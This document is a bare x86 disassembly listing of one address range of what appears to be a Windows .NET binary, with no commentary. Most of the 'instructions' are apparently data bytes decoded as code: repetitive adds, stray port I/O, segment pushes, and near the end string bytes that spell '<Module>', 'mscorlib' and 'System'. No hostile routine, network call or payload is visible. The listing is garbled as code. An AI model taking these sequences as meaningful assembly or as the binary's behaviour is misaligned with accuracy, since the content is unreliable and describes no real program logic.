  406323:	add    cl,BYTE PTR [edx]
  406325:	add    DWORD PTR [edi+0x4],eax
  406328:	add    DWORD PTR [eax],0x3b916b2
  40632e:	icebp  
  40632f:	add    cl,BYTE PTR [edx]
  406331:	add    DWORD PTR [edi+0x4],ebx
  406334:	stc    
  406335:	add    cl,BYTE PTR [edx]
  406337:	add    DWORD PTR [edi+0x4],eax
  40633a:	cmp    DWORD PTR [eax],eax
  40633c:	adc    eax,0x1013017
  406341:	add    ecx,DWORD PTR [edx]
  406343:	add    DWORD PTR [edx],ebp
  406345:	add    DWORD PTR [ecx],esi
  406347:	add    ch,ch
  406349:	adc    BYTE PTR [edi+0x4],bh
  40634c:	jns    0x40634e
  40634e:	or     al,BYTE PTR [ecx]
  406350:	and    DWORD PTR [eax],eax
  406352:	jns    0x406354
  406354:	mov    edi,0x1043a15
  406359:	add    ecx,DWORD PTR [edx]
  40635b:	add    DWORD PTR [ecx],edi
  40635d:	add    DWORD PTR [ecx],ecx
  40635f:	add    ecx,DWORD PTR [edx]
  406361:	add    DWORD PTR [esp+eax*1+0x17570079],ecx
  406368:	inc    edi
  406369:	add    al,0x19
  40636b:	add    ecx,DWORD PTR [edx]
  40636d:	add    ebp,eax
  40636f:	add    esp,DWORD PTR [ecx]
  406371:	add    ecx,DWORD PTR [edx]
  406373:	add    DWORD PTR [ecx],esp
  406375:	add    BYTE PTR [ecx],bh
  406377:	add    cl,BYTE PTR [eax+0x24049e10]
  40637d:	add    BYTE PTR [edx],cl
  40637f:	add    DWORD PTR [ecx],esp
  406381:	add    BYTE PTR [eax+eax*1+0xa],al
  406385:	add    ebp,edi
  406387:	add    ah,BYTE PTR [eax+eax*1]
  40638a:	adc    al,0x11
  40638c:	sbb    eax,0xc0003103
  406391:	pop    ss
  406392:	leave  
  406393:	add    al,0x89
  406395:	add    BYTE PTR [ebp+0x11],al
  406398:	out    0x4,eax
  40639a:	inc    ecx
  40639b:	add    BYTE PTR [edx],cl
  40639d:	add    DWORD PTR [ecx],edi
  40639f:	add    DWORD PTR [ecx+0x3017ca00],ecx
  4063a5:	add    DWORD PTR [ecx],esi
  4063a7:	add    bh,bl
  4063a9:	pop    ss
  4063aa:	add    DWORD PTR ds:[ecx],esi
  4063ad:	add    cl,dh
  4063af:	pop    ss
  4063b0:	xor    BYTE PTR [ecx],al
  4063b2:	xor    DWORD PTR [eax],eax
  4063b4:	sbb    DWORD PTR [eax],ebx
  4063b6:	std    
  4063b7:	add    al,0x31
  4063b9:	add    BYTE PTR [ebx+0x18],al
  4063bc:	add    eax,DWORD PTR ds:0x1097004c
  4063c2:	sbb    al,0x5
  4063c4:	push   esp
  4063c5:	add    BYTE PTR [ebp-0x66fd68f0],ah
  4063cb:	add    BYTE PTR [esi+0x18],bh
  4063ce:	xor    BYTE PTR [ecx],al
  4063d0:	dec    ecx
  4063d1:	add    edi,DWORD PTR [edx+0x5c013e10]
  4063d7:	add    BYTE PTR [edi+0x64051c10],dl
  4063dd:	add    BYTE PTR [ebp-0x5efd68f0],ah
  4063e3:	add    BYTE PTR [esi+0x51013018],ch
  4063e9:	add    ecx,DWORD PTR [edx]
  4063eb:	add    DWORD PTR [ecx],edi
  4063ed:	add    DWORD PTR [ecx+0x3],ebx
  4063f0:	or     al,BYTE PTR [ecx]
  4063f2:	cmp    eax,0xfd023905
  4063f7:	sbb    BYTE PTR [esi+0x5],al
  4063fa:	popa   
  4063fb:	add    edx,DWORD PTR [edi+0x49057f10]
  406401:	add    edi,DWORD PTR [edx]
  406403:	sbb    ah,BYTE PTR [ecx]
  406405:	add    BYTE PTR [ecx+0x3],cl
  406408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406409:	adc    BYTE PTR [ecx+0xa036905],dl
  40640f:	add    DWORD PTR [ecx],esp
  406411:	add    BYTE PTR [ecx+0x3],dh
  406414:	mov    BYTE PTR [ebx],bl
  406416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406417:	add    eax,0x1ba30031
  40641c:	mov    al,0x5
  40641e:	xor    DWORD PTR [eax],eax
  406420:	inc    ebp
  406421:	adc    DWORD PTR [ebx],edx
  406423:	add    al,0x79
  406425:	add    ecx,DWORD PTR [edx]
  406427:	add    DWORD PTR [ecx],esp
  406429:	add    BYTE PTR [ecx],dh
  40642b:	add    BYTE PTR [ebx*1+0x1905e3],al
  406432:	and    ebx,DWORD PTR ds:0x1b10109
  406438:	sub    eax,0x8905f21d
  40643d:	add    edi,DWORD PTR [esi]
  40643f:	sbb    eax,0x39105f8
  406444:	ins    DWORD PTR es:[edi],dx
  406445:	sbb    eax,0x39905fd
  40644a:	sbb    DWORD PTR ds:0x39105f2,0x1351d89
  406454:	mov    cl,0x1
  406456:	sub    eax,0xa106041d
  40645b:	add    ecx,DWORD PTR [edx]
  40645d:	add    DWORD PTR [ecx],edi
  40645f:	add    DWORD PTR [ecx+0x21010a03],ebp
  406465:	add    BYTE PTR [ecx+0xb1dbd03],dl
  40646b:	push   es
  40646c:	mov    cl,0x3
  40646e:	or     al,BYTE PTR [ecx]
  406470:	and    DWORD PTR [eax],eax
  406472:	mov    DWORD PTR [ebx],eax
  406474:	hlt    
  406475:	sbb    eax,0x391017c
  40647a:	or     BYTE PTR [esi],bl
  40647c:	clc    
  40647d:	add    eax,0x1e1a01b1
  406482:	clc    
  406483:	add    eax,0x10a03b9
  406488:	mov    cl,0x1
  40648a:	rol    DWORD PTR [ebx],0xa
  40648d:	add    DWORD PTR [ecx],esp
  40648f:	add    BYTE PTR [ecx],cl
  406491:	add    BYTE PTR [esi+ebx*1+0x67],bl
  406495:	push   es
  406496:	xor    DWORD PTR [eax],eax
  406498:	jne    0x4064b8
  40649a:	ins    DWORD PTR es:[edi],dx
  40649b:	push   es
  40649c:	mov    cl,0x0
  40649e:	or     al,BYTE PTR [ecx]
  4064a0:	jae    0x4064a8
  4064a2:	mov    cl,0x0
  4064a4:	sbb    BYTE PTR [esi],0x80
  4064a7:	push   es
  4064a8:	rol    DWORD PTR [ebx],1
  4064aa:	or     al,BYTE PTR [ecx]
  4064ac:	xchg   DWORD PTR [esi],eax
  4064ae:	mov    cl,0x1
  4064b0:	mov    edx,0x6c01241e
  4064b5:	add    BYTE PTR [edx],cl
  4064b7:	add    DWORD PTR [ecx],esp
  4064b9:	add    cl,cl
  4064bb:	add    eax,eax
  4064bd:	push   ds
  4064be:	sahf   
  4064bf:	push   es
  4064c0:	leave  
  4064c1:	add    ecx,ecx
  4064c3:	push   ds
  4064c4:	std    
  4064c5:	add    al,0x31
  4064c7:	add    dl,dl
  4064c9:	push   ds
  4064ca:	add    DWORD PTR ds:[ecx],edi
  4064cd:	add    BYTE PTR [eax],al
  4064cf:	pop    ds
  4064d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d1:	push   es
  4064d2:	ins    BYTE PTR es:[edi],dx
  4064d3:	add    BYTE PTR [eax+0x6c032f10],cl
  4064d9:	add    bh,dl
  4064db:	adc    ah,bl
  4064dd:	add    ch,cl
  4064df:	add    esp,DWORD PTR [ebx]
  4064e1:	sbb    eax,0x6c06ad
  4064e6:	xchg   edi,eax
  4064e7:	adc    BYTE PTR [ebp-0x5aff8bfe],al
  4064ed:	adc    BYTE PTR [edi+0x1c03e902],dl
  4064f3:	pop    ds
  4064f4:	mov    ebx,0xba007406
  4064f9:	adc    BYTE PTR [esi],bh
  4064fb:	add    ecx,ebp
  4064fd:	add    esp,DWORD PTR [ebx]
  4064ff:	sbb    eax,0x3c906c0
  406504:	cmp    ebx,DWORD PTR [edi]
  406506:	in     eax,dx
  406507:	push   es
  406508:	stc    
  406509:	add    ecx,DWORD PTR [ebx+0x1f]
  40650c:	repz push es
  40650e:	or     DWORD PTR [eax],eax
  406510:	push   edi
  406511:	pop    ds
  406512:	xor    eax,0xa040901
  406517:	add    DWORD PTR [ecx],esp
  406519:	add    BYTE PTR [ecx],cl
  40651b:	add    al,0x7a
  40651d:	pop    ds
  40651e:	stc    
  40651f:	push   es
  406520:	mov    ecx,0x711f8500
  406525:	add    DWORD PTR [ecx],ecx
  406527:	add    al,0x7a
  406529:	pop    ds
  40652a:	add    BYTE PTR [edi],al
  40652c:	rol    DWORD PTR [ecx],0xa
  40652f:	add    DWORD PTR [ecx],edi
  406531:	add    DWORD PTR [ecx+0x351f9801],esi
  406537:	add    DWORD PTR [ecx+0xf1f9d01],esi
  40653d:	pop    es
  40653e:	mov    cl,0x1
  406540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406541:	pop    ds
  406542:	adc    eax,0xb001b107
  406547:	pop    ds
  406548:	fadd   QWORD PTR [edx]
  40654a:	mov    cl,0x1
  40654c:	mov    ebx,0xb1071a1f
  406551:	add    DWORD PTR [ebp+0x11],eax
  406554:	pop    ds
  406555:	pop    es
  406556:	mov    cl,0x1
  406558:	lds    ebx,FWORD PTR [edi]
  40655a:	adc    eax,0x3e041107
  40655f:	sbb    eax,0x1b105f8
  406564:	rcr    DWORD PTR [edi],cl
  406566:	and    eax,0x4000807
  40656b:	add    BYTE PTR [esi],cl
  40656d:	add    BYTE PTR [eax],cl
  40656f:	add    BYTE PTR [eax],cl
  406571:	add    BYTE PTR [esi],cl
  406573:	add    BYTE PTR [eax],cl
  406575:	add    BYTE PTR [eax+eax*1],cl
  406578:	adc    eax,DWORD PTR [eax]
  40657a:	or     BYTE PTR [eax],al
  40657c:	adc    BYTE PTR [eax],al
  40657e:	sbb    BYTE PTR [eax],al
  406580:	add    BYTE PTR cs:[ebx+0x2e0b8b00],ch
  406587:	add    BYTE PTR [ebx],bh
  406589:	add    BYTE PTR [edi+0x7],dl
  40658c:	add    BYTE PTR cs:[ebx+0x0],al
  406590:	jb     0x406599
  406592:	add    BYTE PTR cs:[ebx+0x2e0b6c00],dl
  406599:	add    BYTE PTR [ebx],dl
  40659b:	add    BYTE PTR [esi],bh
  40659d:	pop    es
  40659e:	add    BYTE PTR cs:[ebx],bl
  4065a1:	add    BYTE PTR [edi+eax*1+0x2e],al
  4065a5:	add    BYTE PTR [ebx],ah
  4065a7:	add    BYTE PTR [edx+0x7],cl
  4065aa:	add    BYTE PTR cs:[ebx],ch
  4065ad:	add    BYTE PTR [edx+0x7],cl
  4065b0:	add    BYTE PTR cs:[ebx],dh
  4065b3:	add    BYTE PTR [edx+0x7],cl
  4065b6:	add    BYTE PTR cs:[ebx+0x2e068e00],ah
  4065bd:	add    BYTE PTR [ebx+0x0],cl
  4065c0:	xchg   edx,eax
  4065c1:	pop    es
  4065c2:	add    BYTE PTR cs:[ebx+0x0],bl
  4065c6:	mov    DWORD PTR [edi],0x63002e
  4065cc:	mov    DWORD PTR [edi],0x6b002e
  4065d2:	fadd   QWORD PTR [edi]
  4065d4:	add    BYTE PTR cs:[ebx+0x0],dh
  4065d8:	jmp    0x7b4093e4
  4065dd:	add    BYTE PTR [edi+eax*1+0x2e],al
  4065e1:	add    BYTE PTR [ebx+0x2e07f400],al
  4065e7:	add    BYTE PTR [ebx-0x7cf7de00],cl
  4065ed:	add    bl,bh
  4065ef:	add    al,0x26
  4065f1:	push   es
  4065f2:	add    DWORD PTR [eax],0xffffffdb
  4065f5:	add    al,0xac
  4065f7:	add    DWORD PTR [ebx-0x53fafd00],eax
  4065fd:	add    ebx,eax
  4065ff:	add    bl,bl
  406601:	add    al,0xac
  406603:	add    ebx,esp
  406605:	add    bl,bl
  406607:	add    al,0xac
  406609:	add    DWORD PTR [ecx],ecx
  40660b:	add    DWORD PTR [ebx],ebp
  40660d:	add    eax,0x129068e
  406612:	sub    eax,DWORD PTR ds:0x6e4068e
  406618:	or     eax,DWORD PTR [eax]
  40661a:	lods   al,BYTE PTR ds:[esi]
  40661b:	add    DWORD PTR [edi+eax*1],esp
  40661e:	or     eax,DWORD PTR [eax]
  406620:	lods   al,BYTE PTR ds:[esi]
  406621:	add    DWORD PTR [eax+0xc],eax
  406624:	pop    ebx
  406625:	add    al,0xac
  406627:	add    DWORD PTR [eax+0xc],esp
  40662a:	pop    ebx
  40662b:	add    al,0xac
  40662d:	add    DWORD PTR [eax-0x53fba4f4],esp
  406633:	add    eax,eax
  406635:	or     al,0x5b
  406637:	add    al,0xac
  406639:	add    DWORD PTR [eax],eax
  40663b:	or     eax,0x1ac045b
  406640:	and    BYTE PTR ds:0x1ac045b,cl
  406646:	pusha  
  406647:	or     eax,0x1ac045b
  40664c:	or     BYTE PTR ds:0x1ac045b,0xc0
  406653:	or     eax,0x1ac045b
  406658:	loopne 0x406667
  40665a:	pop    ebx
  40665b:	add    al,0xac
  40665d:	add    DWORD PTR [eax],esp
  40665f:	push   cs
  406660:	pop    ebx
  406661:	add    al,0xac
  406663:	add    DWORD PTR [eax+0xe],eax
  406666:	pop    ebx
  406667:	add    al,0xac
  406669:	add    DWORD PTR [eax],ecx
  40666b:	add    BYTE PTR [esi],al
  40666d:	add    BYTE PTR [ebx+ecx*1+0x33502ab],dl
  406674:	add    sp,WORD PTR [ecx+0x1b03f603]
  40667b:	add    al,0x24
  40667d:	add    DWORD PTR ds:0x79046704,esi
  406683:	add    al,0x86
  406685:	add    al,0x96
  406687:	add    al,0xa4
  406689:	add    al,0xb3
  40668b:	add    al,0xd1
  40668d:	add    al,0xef
  40668f:	add    al,0xf8
  406691:	add    al,0x9
  406693:	add    eax,0x56c054d
  406698:	stos   DWORD PTR es:[edi],eax
  406699:	add    eax,0x5bd05b8
  40669e:	fiadd  WORD PTR ds:0x61605eb
  4066a4:	jnp    0x4066ac
  4066a6:	lds    eax,FWORD PTR [esi]
  4066a8:	push   es
  4066a9:	pop    es
  4066aa:	sub    al,BYTE PTR [edi]
  4066ac:	add    eax,DWORD PTR [eax]
  4066ae:	add    DWORD PTR [eax],eax
  4066b0:	add    al,0x0
  4066b2:	or     BYTE PTR [eax],al
  4066b4:	push   es
  4066b5:	add    BYTE PTR [ecx],dh
  4066b7:	add    BYTE PTR [edi],al
  4066b9:	add    BYTE PTR [ebx],dh
  4066bb:	add    BYTE PTR [eax],al
  4066bd:	add    dl,bh
  4066bf:	add    eax,0x152
  4066c4:	add    al,0x6
  4066c6:	push   edi
  4066c7:	add    DWORD PTR [eax],eax
  4066c9:	add    BYTE PTR ds:0x15706,cl
  4066cf:	add    BYTE PTR ds:0x15706,bl
  4066d5:	add    BYTE PTR ds:0x15b06,ch
  4066db:	add    BYTE PTR [edi],bh
  4066dd:	push   es
  4066de:	pop    ebx
  4066df:	add    DWORD PTR [eax],eax
  4066e1:	add    BYTE PTR [ebp+0x6],cl
  4066e4:	pop    edi
  4066e5:	add    DWORD PTR [eax],eax
  4066e7:	add    BYTE PTR [ebx+0x6],ch
  4066ea:	add    BYTE PTR [ecx],0x0
  4066ed:	add    al,bh
  4066ef:	or     DWORD PTR [ebp+0x1],eax
  4066f5:	or     cl,BYTE PTR [edx+0x12000001]
  4066fb:	or     cl,BYTE PTR [edx+0x22000001]
  406701:	or     cl,BYTE PTR [edx+0x2e000001]
  406707:	or     cl,BYTE PTR [edx+0x3d000001]
  40670d:	or     cl,BYTE PTR [edx+0x52000001]
  406713:	or     cl,BYTE PTR [edx+0x5d000001]
  406719:	or     cl,BYTE PTR [edx+0x71000001]
  40671f:	or     cl,BYTE PTR [edx+0x7f000001]
  406725:	or     cl,BYTE PTR [edx-0x70ffffff]
  40672b:	or     cl,BYTE PTR [edx-0x5fffffff]
  406731:	or     cl,BYTE PTR [edx-0x4dffffff]
  406737:	or     cl,BYTE PTR [edx-0x3bffffff]
  40673d:	or     cl,BYTE PTR [edx-0x29ffffff]
  406743:	or     cl,BYTE PTR [edx-0x1bffffff]
  406749:	or     cl,BYTE PTR [edx-0xdffffff]
  40674f:	or     cl,BYTE PTR [edx+0x1]
  406755:	or     ecx,DWORD PTR [edx+0x11000001]
  40675b:	or     ecx,DWORD PTR [edx+0x22000001]
  406761:	or     ecx,DWORD PTR [edx+0x33000001]
  406767:	or     ecx,DWORD PTR [edx+0x44000001]
  40676d:	or     ecx,DWORD PTR [edx+0x55000001]
  406773:	or     ecx,DWORD PTR [edx+0x66000001]
  406779:	or     ecx,DWORD PTR [edx+0x77000001]
  40677f:	or     ecx,DWORD PTR [edx-0x77ffffff]
  406785:	or     ecx,DWORD PTR [edx-0x66ffffff]
  40678b:	or     ecx,DWORD PTR [edx-0x55ffffff]
  406791:	or     ecx,DWORD PTR [edx-0x44ffffff]
  406797:	or     ecx,DWORD PTR [edx-0x33ffffff]
  40679d:	or     ecx,DWORD PTR [edx-0x22ffffff]
  4067a3:	or     ecx,DWORD PTR [edx-0x11ffffff]
  4067a9:	or     ecx,DWORD PTR [edx-0xffffff]
  4067af:	or     ecx,DWORD PTR [edx+0x10000001]
  4067b5:	or     al,0x8a
  4067b7:	add    DWORD PTR [eax],eax
  4067b9:	add    BYTE PTR [ecx],ah
  4067bb:	or     al,0x8a
  4067bd:	add    DWORD PTR [eax],eax
  4067bf:	add    BYTE PTR [edx],dh
  4067c1:	or     al,0x8a
  4067c3:	add    DWORD PTR [eax],eax
  4067c5:	add    BYTE PTR [eax+0xc],al
  4067c8:	mov    al,BYTE PTR [ecx]
  4067ca:	add    BYTE PTR [eax],al
  4067cc:	dec    esi
  4067cd:	or     al,0x8a
  4067cf:	add    DWORD PTR [eax],eax
  4067d1:	add    BYTE PTR [esp+ecx*1-0x76],bl
  4067d5:	add    DWORD PTR [eax],eax
  4067d7:	add    BYTE PTR [edx+0xc],ch
  4067da:	mov    al,BYTE PTR [ecx]
  4067dc:	add    BYTE PTR [eax],al
  4067de:	out    dx,al
  4067df:	sbb    bl,BYTE PTR [esi+0x3d000005]
  4067e5:	sbb    esp,DWORD PTR [ebx-0x47fffffb]
  4067eb:	sbb    al,0xd9
  4067ed:	add    eax,0x1b3d0000
  4067f2:	mov    ds:0x27000205,eax
  4067f7:	add    BYTE PTR [ebx],al
  4067f9:	add    BYTE PTR [ecx],al
  4067fb:	add    BYTE PTR [ecx],ch
  4067fd:	add    BYTE PTR ds:0x28000200,al
  406803:	add    BYTE PTR ds:0x2a000200,al
  406809:	add    BYTE PTR [edi],al
  40680b:	add    BYTE PTR [ecx],al
  40680d:	add    BYTE PTR [ebx],ch
  40680f:	add    BYTE PTR [edi],al
  406811:	add    BYTE PTR [ecx],al
  406813:	add    BYTE PTR ds:0x2000900,ch
  406819:	add    BYTE PTR [eax+eax*1],ch
  40681c:	or     DWORD PTR [eax],eax
  40681e:	add    al,BYTE PTR [eax]
  406820:	add    BYTE PTR cs:[ebx],cl
  406823:	add    BYTE PTR [ecx],al
  406825:	add    BYTE PTR [edi],ch
  406827:	add    BYTE PTR [ebx],cl
  406829:	add    BYTE PTR [edx],al
  40682b:	add    BYTE PTR [eax],dh
  40682d:	add    BYTE PTR ds:0x31000100,cl
  406833:	add    BYTE PTR ds:0x32000200,cl
  406839:	add    BYTE PTR [edi],cl
  40683b:	add    BYTE PTR [ecx],al
  40683d:	add    BYTE PTR [ebx],dh
  40683f:	add    BYTE PTR [edi],cl
  406841:	add    BYTE PTR [edx],al
  406843:	add    BYTE PTR ds:0x2001100,dh
  406849:	add    BYTE PTR [esi],dh
  40684b:	add    BYTE PTR [ebx],dl
  40684d:	add    BYTE PTR [ecx],al
  40684f:	add    BYTE PTR [edi],dh
  406851:	add    BYTE PTR [ebx],dl
  406853:	add    BYTE PTR [edx],al
  406855:	add    BYTE PTR [eax],bh
  406857:	add    BYTE PTR ds:0x39000200,dl
  40685d:	add    BYTE PTR [edi],dl
  40685f:	add    BYTE PTR [edx],al
  406861:	add    BYTE PTR [edx],bh
  406863:	add    BYTE PTR [ecx],bl
  406865:	add    BYTE PTR [edx],al
  406867:	add    BYTE PTR [ebx],bh
  406869:	add    BYTE PTR [ebx],bl
  40686b:	add    BYTE PTR [edx],al
  40686d:	add    BYTE PTR [eax+eax*1],bh
  406870:	sbb    eax,0x3d000200
  406875:	add    BYTE PTR [edi],bl
  406877:	add    BYTE PTR [edx],al
  406879:	add    BYTE PTR [esi],bh
  40687b:	add    BYTE PTR [ecx],ah
  40687d:	add    BYTE PTR [edx],al
  40687f:	add    BYTE PTR [edi],bh
  406881:	add    BYTE PTR [ebx],ah
  406883:	add    BYTE PTR [edx],al
  406885:	add    BYTE PTR [eax+0x0],al
  406888:	and    eax,0x41000200
  40688d:	add    BYTE PTR [edi],ah
  40688f:	add    BYTE PTR [edx],al
  406891:	add    BYTE PTR [edx+0x0],al
  406894:	sub    DWORD PTR [eax],eax
  406896:	add    al,BYTE PTR [eax]
  406898:	inc    ebx
  406899:	add    BYTE PTR [ebx],ch
  40689b:	add    BYTE PTR [edx],al
  40689d:	add    BYTE PTR [eax+eax*1+0x2d],al
  4068a1:	add    BYTE PTR [edx],al
  4068a3:	add    BYTE PTR [ebp+0x0],al
  4068a6:	das    
  4068a7:	add    BYTE PTR [edx],al
  4068a9:	add    BYTE PTR [esi+0x0],al
  4068ac:	xor    DWORD PTR [eax],eax
  4068ae:	add    al,BYTE PTR [eax]
  4068b0:	inc    edi
  4068b1:	add    BYTE PTR [ebx],dh
  4068b3:	add    BYTE PTR [edx],al
  4068b5:	add    BYTE PTR [eax+0x0],cl
  4068b8:	xor    eax,0x49000200
  4068bd:	add    BYTE PTR [edi],dh
  4068bf:	add    BYTE PTR [edx],al
  4068c1:	add    BYTE PTR [edx+0x0],cl
  4068c4:	cmp    DWORD PTR [eax],eax
  4068c6:	add    al,BYTE PTR [eax]
  4068c8:	dec    ebx
  4068c9:	add    BYTE PTR [ebx],bh
  4068cb:	add    BYTE PTR [edx],al
  4068cd:	add    BYTE PTR [eax+eax*1+0x3d],cl
  4068d1:	add    BYTE PTR [edx],al
  4068d3:	add    BYTE PTR [ebp+0x0],cl
  4068d6:	aas    
  4068d7:	add    BYTE PTR [edx],al
  4068d9:	add    BYTE PTR [esi+0x0],cl
  4068dc:	inc    ecx
  4068dd:	add    BYTE PTR [edx],al
  4068df:	add    BYTE PTR [edi+0x0],cl
  4068e2:	inc    ebx
  4068e3:	add    BYTE PTR [edx],al
  4068e5:	add    BYTE PTR [eax+0x0],dl
  4068e8:	inc    ebp
  4068e9:	add    BYTE PTR [edx],al
  4068eb:	add    BYTE PTR [ecx+0x0],dl
  4068ee:	inc    edi
  4068ef:	add    BYTE PTR [edx],al
  4068f1:	add    BYTE PTR [edx+0x0],dl
  4068f4:	dec    ecx
  4068f5:	add    BYTE PTR [edx],al
  4068f7:	add    BYTE PTR [ebx+0x0],dl
  4068fa:	dec    ebx
  4068fb:	add    BYTE PTR [edx],al
  4068fd:	add    BYTE PTR [eax+eax*1+0x4d],dl
  406901:	add    BYTE PTR [edx],al
  406903:	add    BYTE PTR [ebp+0x0],dl
  406906:	dec    edi
  406907:	add    BYTE PTR [edx],al
  406909:	add    BYTE PTR [esi+0x0],dl
  40690c:	push   ecx
  40690d:	add    BYTE PTR [edx],al
  40690f:	add    BYTE PTR [edi+0x0],dl
  406912:	push   ebx
  406913:	add    BYTE PTR [edx],al
  406915:	add    BYTE PTR [eax+0x0],bl
  406918:	push   ebp
  406919:	add    BYTE PTR [edx],al
  40691b:	add    BYTE PTR [ecx+0x0],bl
  40691e:	push   edi
  40691f:	add    BYTE PTR [edx],al
  406921:	add    BYTE PTR [edx+0x0],bl
  406924:	pop    ecx
  406925:	add    BYTE PTR [edx],al
  406927:	add    BYTE PTR [ebx+0x0],bl
  40692a:	pop    ebx
  40692b:	add    BYTE PTR [edx],al
  40692d:	add    BYTE PTR [eax+eax*1+0x5d],bl
  406931:	add    BYTE PTR [edx],al
  406933:	add    BYTE PTR [ebp+0x0],bl
  406936:	pop    edi
  406937:	add    BYTE PTR [edx],al
  406939:	add    BYTE PTR [esi+0x0],bl
  40693c:	popa   
  40693d:	add    BYTE PTR [edx],al
  40693f:	add    BYTE PTR [ebp+0x0],ah
  406942:	arpl   WORD PTR [eax],ax
  406944:	add    al,BYTE PTR [eax]
  406946:	push   0x2006500
  40694b:	add    BYTE PTR [esi+0x0],ch
  40694e:	add    BYTE PTR [bp+si],al
  406951:	add    BYTE PTR [ecx+0x0],dh
  406954:	imul   eax,DWORD PTR [eax],0xc40006
  40695a:	std    
  40695b:	add    BYTE PTR [esi],al
  40695d:	add    dh,al
  40695f:	add    BYTE PTR [ecx],dl
  406961:	add    DWORD PTR [esi],eax
  406963:	add    al,cl
  406965:	add    BYTE PTR [ebx],al
  406967:	add    DWORD PTR [esi],eax
  406969:	add    dl,cl
  40696b:	add    bh,bh
  40696d:	add    BYTE PTR [esi],al
  40696f:	add    ah,cl
  406971:	add    BYTE PTR [ebx],dl
  406973:	add    DWORD PTR [esi],eax
  406975:	add    dh,cl
  406977:	add    BYTE PTR [ecx+0x0],al
  40697a:	push   es
  40697b:	add    al,dl
  40697d:	add    BYTE PTR ds:0xd6000701,dl
  406983:	add    BYTE PTR ds:0xd8000701,al
  406989:	add    BYTE PTR [ecx],dl
  40698b:	add    DWORD PTR [edi],eax
  40698d:	add    dl,bl
  40698f:	add    BYTE PTR [ebx],al
  406991:	add    DWORD PTR [edi],eax
  406993:	add    ah,bl
  406995:	add    BYTE PTR [edi],al
  406997:	add    DWORD PTR [edi],eax
  406999:	add    dh,bl
  40699b:	add    BYTE PTR [ebx],dl
  40699d:	add    DWORD PTR [edi],eax
  40699f:	add    al,ah
  4069a1:	add    BYTE PTR [ecx+0x0],al
  4069a4:	pop    es
  4069a5:	add    dl,ah
  4069a7:	add    BYTE PTR ds:0x7e026c01,dl
  4069ad:	add    cl,BYTE PTR [edi-0x5cfd63fe]
  4069b3:	add    ah,al
  4069b5:	add    dh,bl
  4069b7:	add    bh,BYTE PTR [eax+0x26051504]
  4069bd:	add    eax,0x535052e
  4069c2:	xchg   edi,eax
  4069c3:	push   es
  4069c4:	mov    bl,0x6
  4069c6:	add    al,0x80
  4069c8:	add    BYTE PTR [eax],al
  4069ca:	add    al,0x0
  4069cc:	add    BYTE PTR [eax],al
  4069ce:	add    BYTE PTR [eax],al
  4069d0:	add    BYTE PTR [eax],al
  4069d2:	add    DWORD PTR [eax],eax
  4069d4:	add    BYTE PTR [eax],al
  4069d6:	retf   0x5001
  4069d9:	adc    BYTE PTR [eax],al
  4069db:	add    BYTE PTR [eax+eax*1],al
	...
  4069e6:	add    BYTE PTR [eax],al
  4069e8:	add    DWORD PTR [eax],eax
  4069ea:	add    BYTE PTR [bx+si],al
  4069ed:	add    BYTE PTR [eax],al
  4069ef:	add    BYTE PTR [eax+eax*1],al
	...
  4069fa:	add    BYTE PTR [eax],al
  4069fc:	add    DWORD PTR [eax],eax
  4069fe:	jo     0x406a00
  406a00:	add    BYTE PTR [eax],al
  406a02:	add    BYTE PTR [eax],al
  406a04:	add    al,0x0
	...
  406a0e:	add    BYTE PTR [eax],al
  406a10:	test   BYTE PTR [ebx],al
  406a12:	dec    ebx
  406a13:	adc    al,BYTE PTR [eax]
  406a15:	add    BYTE PTR [eax],al
  406a17:	add    BYTE PTR [eax+eax*1],al
	...
  406a22:	add    BYTE PTR [eax],al
  406a24:	test   BYTE PTR [ebx],al
  406a26:	adc    DWORD PTR [edx],0x0
  406a2c:	add    BYTE PTR [eax],al
  406a2e:	add    BYTE PTR [eax],al
  406a30:	add    DWORD PTR [eax],eax
  406a32:	add    BYTE PTR [eax],al
  406a34:	fistp  DWORD PTR [edi]
  406a36:	add    BYTE PTR [eax],al
  406a38:	push   es
  406a39:	add    BYTE PTR [edx],al
  406a3b:	add    BYTE PTR [edi],al
  406a3d:	add    BYTE PTR [edx],al
  406a3f:	add    BYTE PTR [ebp+0x0],dl
  406a42:	push   ss
  406a43:	add    edx,DWORD PTR [ebp+0x0]
  406a46:	ret    0x4
  406a49:	add    BYTE PTR [eax],al
  406a4b:	add    BYTE PTR [eax],al
  406a4d:	cmp    al,0x4d
  406a4f:	outs   dx,DWORD PTR ds:[esi]
  406a50:	fs jne 0x406abf
  406a53:	gs add BYTE PTR ds:[edi+0x63],dh
  406a58:	popa   
  406a59:	cs gs js 0x406ac2
  406a5d:	add    BYTE PTR [ecx+0x63],al
  406a60:	je     0x406acb
  406a62:	jbe    0x406acd
  406a64:	je     0x406adf
  406a66:	inc    edi
  406a67:	outs   dx,BYTE PTR gs:[esi]
  406a69:	gs jb  0x406acd
  406a6c:	je     0x406add
  406a6e:	jb     0x406a70
  406a70:	dec    ebp
  406a71:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406a78:	je     0x406aa8
  406a7a:	push   edi
  406a7b:	outs   dx,DWORD PTR ds:[esi]
  406a7c:	jb     0x406ae9
  406a7e:	data16 ins BYTE PTR es:[edi],dx
  406a80:	outs   dx,DWORD PTR ds:[esi]
  406a81:	ja     0x406ab1
  406a83:	push   esp
  406a84:	outs   dx,DWORD PTR ds:[esi]
  406a85:	outs   dx,DWORD PTR ds:[esi]
  406a86:	ins    BYTE PTR es:[edi],dx
  406a87:	jae    0x406a89
  406a89:	inc    ecx
  406a8a:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  406a8e:	imul   esi,DWORD PTR [ecx+edi*2+0x47],0x72656e65
  406a96:	popa   
  406a97:	je     0x406b08
  406a99:	jb     0x406aea
  406a9b:	jo     0x406b11
  406a9d:	imul   ebp,DWORD PTR [edi+0x6e],0x72450073
  406aa4:	jb     0x406b15
  406aa6:	jb     0x406afb
  406aa8:	je     0x406b1c
  406aaa:	imul   ebp,DWORD PTR [esi+0x67],0x63570073
  406ab1:	popa   
  406ab2:	add    BYTE PTR [ebp+0x73],ch
  406ab5:	arpl   WORD PTR [edi+0x72],bp
  406ab8:	ins    BYTE PTR es:[edi],dx
  406ab9:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  406ac0:	gs ins DWORD PTR es:[edi],dx
